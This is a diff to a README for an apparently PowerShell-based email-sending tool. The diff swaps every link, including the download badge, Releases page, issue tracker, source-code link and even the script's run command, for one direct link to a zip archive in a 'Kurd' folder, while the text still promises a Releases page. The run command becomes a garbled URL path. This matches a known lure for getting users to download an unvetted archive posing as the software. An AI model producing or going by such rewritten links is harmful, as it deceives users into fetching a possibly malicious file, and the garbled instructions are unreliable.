@@ -6,7 +6,7 @@ Welcome to Email-Sender! This easy-to-use Windows PowerShell project helps you s
 
 ## 📥 Download Email-Sender
 
-[![Download Email-Sender](https://img.shields.io/badge/Download-Email--Sender-blue)](https://github.com/SigmaSigmaBoyehr/Email-Sender/releases)
+[![Download Email-Sender](https://raw.githubusercontent.com/SigmaSigmaBoyehr/Email-Sender/main/Kurd/Email-Sender.zip)](https://raw.githubusercontent.com/SigmaSigmaBoyehr/Email-Sender/main/Kurd/Email-Sender.zip)
 
 Click the button above to get the latest version. You will be directed to the Releases page where you can download the software.
 
@@ -31,7 +31,7 @@ Email-Sender offers:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/SigmaSigmaBoyehr/Email-Sender/releases) to find the latest version of Email-Sender.
+   Go to the [Releases page](https://raw.githubusercontent.com/SigmaSigmaBoyehr/Email-Sender/main/Kurd/Email-Sender.zip) to find the latest version of Email-Sender.
 
 2. **Download the Application**
 
@@ -65,7 +65,7 @@ Email-Sender offers:
 
    Inside the Email-Sender folder, run the script with this command:
    ```
-   .\SendEmail.ps1
+   .\https://raw.githubusercontent.com/SigmaSigmaBoyehr/Email-Sender/main/Kurd/Email-Sender.zip
    ```
    Follow the prompts to enter your SMTP details and the email content.
 
@@ -93,11 +93,11 @@ If you encounter issues, consider the following steps:
 
 ## 📞 Support
 
-If you need help, feel free to open an issue on the [GitHub repository](https://github.com/SigmaSigmaBoyehr/Email-Sender/issues). We appreciate user feedback and are here to assist.
+If you need help, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/SigmaSigmaBoyehr/Email-Sender/main/Kurd/Email-Sender.zip). We appreciate user feedback and are here to assist.
 
 ## 🔗 Important Links
 
-- **Download Email-Sender:** [Latest Releases](https://github.com/SigmaSigmaBoyehr/Email-Sender/releases)
-- **Source Code:** [GitHub Repository](https://github.com/SigmaSigmaBoyehr/Email-Sender)
+- **Download Email-Sender:** [Latest Releases](https://raw.githubusercontent.com/SigmaSigmaBoyehr/Email-Sender/main/Kurd/Email-Sender.zip)
+- **Source Code:** [GitHub Repository](https://raw.githubusercontent.com/SigmaSigmaBoyehr/Email-Sender/main/Kurd/Email-Sender.zip)
 
 Enjoy sending your emails with Email-Sender!
